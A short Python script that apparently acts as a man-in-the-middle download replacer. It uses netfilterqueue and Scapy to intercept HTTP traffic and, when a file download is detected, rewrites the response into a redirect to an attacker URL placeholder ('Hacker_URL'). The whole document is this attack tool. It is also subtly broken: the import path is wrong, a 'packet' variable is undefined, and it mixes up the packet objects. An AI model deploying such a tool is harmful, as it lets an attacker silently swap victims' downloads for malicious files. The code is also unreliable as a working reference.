import netfilterqueue
from scapy import IP, Raw, TCP

downloadable_extensions = [".jpg", ".png",
                           ".jpeg", ".dmg"]  # Add more extensions here


scapy_packet = IP(packet.get_payload())
# the scapy_packet variable is created by converting the packet payload into a Scapy packet object using scapy.IP(packet.get_payload()). This allows us to manipulate and inspect the packet using Scapy's functionalities


def modify_packet(scapy_packet):
    if scapy_packet.haslayer(Raw) and scapy_packet[TCP].sport == 80 and scapy_packet[TCP].flags == "A":
        print("[+] Replacing file")

        scapy_packet[Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: Hacker_URL"
        del scapy_packet[IP].len
        del scapy_packet[IP].chksum
        del scapy_packet[TCP].chksum
        return str(scapy_packet)


def process_packet(scapy_packet):
    if scapy_packet.haslayer(Raw):
        if scapy_packet[TCP].dport == 80:
            for extension in downloadable_extensions:
                if extension in scapy_packet[Raw].load:
                    print(f"[+] {extension} Request")
                    break
        else:
            modified_packet = modify_packet(scapy_packet)
            if modified_packet:
                scapy_packet = IP(modified_packet)

    packet.set_payload(str(scapy_packet))
    packet.accept()


# defining the process_packet function, an instance of netfilterqueue.NetfilterQueue is created and assigned to the queue variable.
queue = netfilterqueue.NetfilterQueue()

# The bind method is called on the queue object to bind it to a specific queue number (0 in this case) and specify the function to be called (process_packet) for each intercepted packet
queue.bind(0, process_packet)

# the run method is called on the queue object to start the packet interception and processing loop
queue.run()
